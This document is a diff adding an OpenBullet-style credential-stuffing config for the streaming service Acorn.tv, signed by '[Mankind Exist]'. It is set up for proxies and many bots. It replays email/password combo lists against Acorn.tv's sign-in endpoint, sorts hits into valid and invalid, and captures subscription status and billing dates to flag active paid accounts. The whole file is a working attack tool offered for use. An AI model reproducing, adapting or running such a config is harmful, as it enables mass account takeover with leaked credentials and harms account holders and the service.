@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "Acorn.tv [Mankind Exist]",
+  "SuggestedBots": 120,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-12T11:42:50.0018218+05:30",
+  "AdditionalInfo": "",
+  "Author": "[Mankind Exist]",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 1426897682
+    }
+  ],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://signup.acorn.tv/initializeapp" 
+  CONTENT "{\"App\":{\"AppVersion\":\"Sign-Up-Website\"},\"Credentials\":{\"Username\":\"<USER>\",\"Password\":\"<PASS>\"},\"Request\":{\"SplitScenario\":\"TRIAL_SIGNUP\",\"OperationalScenario\":\"SIGNIN\",\"Referer\":\"\"}}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Host: signup.acorn.tv" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows Mankind 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Length: 204" 
+  HEADER "Origin: https://signup.acorn.tv" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://signup.acorn.tv/signin.jsp" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"No account with that email address exists.\"}" 
+    KEY "Sign in failed. Please check your sign in information and try again" 
+  KEYCHAIN Success OR 
+    KEY "\"Email\":\"" 
+    KEY "\"LoggedIn\":true," 
+
+PARSE "<SOURCE>" JSON "Status" CreateEmpty=FALSE -> CAP "Status" 
+
+PARSE "<SOURCE>" JSON "Renewable" CreateEmpty=FALSE -> CAP "Renewable" 
+
+PARSE "<SOURCE>" JSON "NextBillingDate" CreateEmpty=FALSE -> CAP "Next Billing Date" 
+
+PARSE "<SOURCE>" LR "\"Subscription\":{\"Status\":\"" "\"," CreateEmpty=FALSE -> CAP "Subscription" 
+
+FUNCTION Constant "[Mankind Exist]" -> CAP "Config By" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<Status>" EqualTo "ACTIVE" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Subscription>" EqualTo "NONE" 
+    KEY "<Status>" EqualTo "CANCELED" 
+    KEY "<Subscription>" EqualTo "EXPIRED" 
+
